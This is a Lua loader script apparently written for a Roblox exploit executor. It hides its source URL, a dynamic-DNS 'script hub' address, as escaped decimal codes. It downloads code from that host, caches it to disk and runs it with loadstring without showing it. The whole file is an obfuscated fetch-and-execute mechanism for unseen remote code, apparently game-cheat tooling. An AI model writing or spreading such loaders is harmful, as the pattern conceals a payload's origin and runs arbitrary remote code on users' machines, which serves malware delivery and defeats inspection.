local API  = "\104\116\116\112\115\58\47\47\97\115\116\114\97\108\100\101\118\46\100\117\99\107\100\110\115\46\111\114\103\47\97\112\105\47\104\117\98"
local C_B  = "_adh_b"
local C_T  = "_adh_t"
local C_E  = "_adh_e"
local TTL  = 86400

local function notify(msg, dur)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "",
            Text = msg or "",
            Duration = dur or 5,
        })
    end)
end

local hasDisk = type(isfile) == "function" and type(readfile) == "function" and type(writefile) == "function"

local function readCache()
    if not hasDisk then return nil, nil end
    if not isfile(C_B) or not isfile(C_T) then return nil, nil end
    local ts = tonumber(readfile(C_T)) or 0
    if os.time() - ts > TTL then return nil, nil end
    local body = readfile(C_B)
    if not body or #body < 500 then return nil, nil end
    local etag = isfile(C_E) and readfile(C_E) or nil
    return body, etag
end

local function saveCache(body, etag)
    if not hasDisk then return end
    pcall(function()
        writefile(C_B, body)
        writefile(C_T, tostring(os.time()))
        if etag and #etag > 0 then writefile(C_E, etag) end
    end)
end

local function clearCache()
    if not hasDisk or not delfile then return end
    pcall(function() delfile(C_B) end)
    pcall(function() delfile(C_T) end)
    pcall(function() delfile(C_E) end)
end

local function getReq()
    return (syn and syn.request) or (http and http.request) or http_request or request
end

local function getEtag(h)
    if type(h) ~= "table" then return nil end
    return h["ETag"] or h["etag"] or h["Etag"]
end

local function revalidate(etag)
    local req = getReq()
    if not req or not etag then return nil end
    local ok, res = pcall(req, {
        Url = API,
        Method = "GET",
        Headers = { ["If-None-Match"] = etag },
    })
    if not ok or not res then return nil end
    if res.StatusCode == 304 then return "fresh" end
    if res.StatusCode == 200 and res.Body and #res.Body >= 500 then
        return "stale", res.Body, getEtag(res.Headers)
    end
    return nil
end

local function fetch()
    local req = getReq()
    if req then
        local res = req({ Url = API, Method = "GET" })
        if not res or res.StatusCode ~= 200 then
            error("HTTP " .. tostring(res and res.StatusCode or "nil"))
        end
        return res.Body, getEtag(res.Headers)
    end
    return game:HttpGet(API), nil
end

local ok, err = pcall(function()
    local body, cachedEtag = readCache()
    local fromCache = body ~= nil
    local newEtag = nil

    if fromCache and cachedEtag then
        local status, freshBody, freshEtag = revalidate(cachedEtag)
        if status == "stale" then
            body = freshBody
            newEtag = freshEtag
            fromCache = false
        end
    end

    if not body then
        body, newEtag = fetch()
    end

    if not body or #body < 500 then
        error("empty (" .. tostring(body and #body or 0) .. ")")
    end

    local chunk, loadErr = loadstring(body)
    if not chunk then
        if fromCache then
            clearCache()
            body, newEtag = fetch()
            if not body or #body < 500 then error("empty retry") end
            chunk, loadErr = loadstring(body)
            if not chunk then error(tostring(loadErr)) end
            fromCache = false
        else
            error(tostring(loadErr))
        end
    end

    if not fromCache then saveCache(body, newEtag) end
    chunk()
end)

if not ok then
    notify(tostring(err), 8)
end
